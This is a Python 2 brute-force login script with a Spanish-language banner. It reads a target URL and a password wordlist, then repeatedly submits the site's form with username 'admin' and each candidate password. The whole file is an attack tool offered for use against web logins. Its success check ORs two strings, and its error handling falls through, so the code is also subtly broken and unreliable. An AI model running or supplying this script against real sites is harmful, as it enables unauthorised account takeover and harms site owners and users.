import mechanize

print "   _____                                    ___.                 __           "
print "_/ ____\_ __   ________________________    \_ |_________ __ ___/  |______     "
print "\   __\  |  \_/ __ \_  __ \___   /\__  \    | __ \_  __ \  |  \   __\__  \    "
print " |  | |  |  /\  ___/|  | \//    /  / __ \_  | \_\ \  | \/  |  /|  |  / __ \_  "
print " |__| |____/  \___  >__|  /_____ \(____  /  |___  /__|  |____/ |__| (____  /  "
print "                  \/            \/     \/       \/                       \/   "
print "																		         "
print "                          Alberto Montiel / Raquel Royon 	    	         "
print "                                     TEAM KITTY                               "
print "                                                                              "

b=mechanize.Browser()

url = raw_input("URL: ")

wordlist = raw_input("Dicc Path: ")

try:
	wordlist = open(wordlist, "r")

except:
	print "no se encontro el Diccionario"

for password in wordlist:
	responde = b.open(url)
	b.select_form()

	b.form["username"] = "admin"
	b.form["password"] = password.strip()
	responde = b.submit()

	if responde.geturl() | url:
		print "[+] Password found: " +password.strip()
		break
